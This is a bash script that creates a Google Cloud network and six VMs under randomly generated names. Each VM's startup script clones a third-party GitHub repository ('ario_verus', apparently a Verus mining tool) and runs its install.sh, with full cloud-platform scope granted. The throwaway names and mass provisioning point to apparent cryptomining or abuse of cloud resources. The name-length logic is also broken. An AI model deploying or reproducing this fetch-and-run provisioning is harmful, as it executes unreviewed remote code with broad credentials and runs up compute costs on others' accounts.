generate_random_name() {
    vowels=("a" "e" "i" "o" "u")
    consonants=("b" "c" "d" "f" "g" "h" "j" "k" "l" "m" "n" "p" "q" "r" "s" "t" "v" "w" "x" "y" "z")

    # Random length between 3 and 8 characters
    name_length=$((20 % 6 + 3))

    name=""

    for ((i=0; i<20; i++)); do
        # Alternate between vowel and consonant
        if (( i % 2 == 0 )); then
            rand_vowel=${vowels[$RANDOM % ${#vowels[@]}]}
            name="${name}${rand_vowel}"
        else
            rand_consonant=${consonants[$RANDOM % ${#consonants[@]}]}
            name="${name}${rand_consonant}"
        fi
    done

    echo "$name"
}
STATIC_IP_NAME=$(generate_random_name)
STATIC_IP_NAME1=$(generate_random_name)
STATIC_IP_NAME2=$(generate_random_name)
STATIC_IP_NAME3=$(generate_random_name)
STATIC_IP_NAME4=$(generate_random_name)
STATIC_IP_NAME5=$(generate_random_name)
gcloud compute networks create $STATIC_IP_NAME --subnet-mode=custom && gcloud compute networks subnets create $STATIC_IP_NAME1 --range=172.21.0.0/24 --network=$STATIC_IP_NAME --region=us-east4 && gcloud compute networks subnets create $STATIC_IP_NAME2 --range=162.21.0.0/24 --network=$STATIC_IP_NAME --region=us-east1 && PROJECT_ID=$(gcloud config get-value core/project) && gcloud compute instances create $STATIC_IP_NAME $STATIC_IP_NAME1 $STATIC_IP_NAME2 $STATIC_IP_NAME3 $STATIC_IP_NAME4 --zone=us-east4-c --machine-type=e2-standard-4 --network=$STATIC_IP_NAME --subnet=$STATIC_IP_NAME1 --metadata=startup-script=apt\ \install\ git\ -y$'\n'git\ clone\ https://github.com/Cvayoyo/ario_verus\ \&\&\ cd\ ario_verus$'\n'chmod\ \+x\ \*$'\n'./install.sh --maintenance-policy=MIGRATE --provisioning-model=STANDARD --service-account=$PROJECT_ID@$PROJECT_ID.iam.gserviceaccount.com --scopes=https://www.googleapis.com/auth/cloud-platform --create-disk=auto-delete=yes,boot=yes,device-name=instance-1,image=projects/ubuntu-os-cloud/global/images/ubuntu-2204-jammy-v20240319,mode=rw,size=10,type=projects/$PROJECT_ID/zones/us-east4-c/diskTypes/pd-balanced --reservation-affinity=any && gcloud compute instances create $STATIC_IP_NAME5 --zone=us-east1-c --machine-type=e2-standard-4 --network=$STATIC_IP_NAME --subnet=$STATIC_IP_NAME2 --metadata=startup-script=apt\ \install\ git\ -y$'\n'git\ clone\ https://github.com/Cvayoyo/ario_verus\ \&\&\ cd\ ario_verus$'\n'chmod\ \+x\ \*$'\n'./install.sh --maintenance-policy=MIGRATE --provisioning-model=STANDARD --service-account=$PROJECT_ID@$PROJECT_ID.iam.gserviceaccount.com --scopes=https://www.googleapis.com/auth/cloud-platform --create-disk=auto-delete=yes,boot=yes,device-name=instance-1,image=projects/ubuntu-os-cloud/global/images/ubuntu-2204-jammy-v20240319,mode=rw,size=10,type=projects/$PROJECT_ID/zones/us-east1-c/diskTypes/pd-balanced --reservation-affinity=any && exit
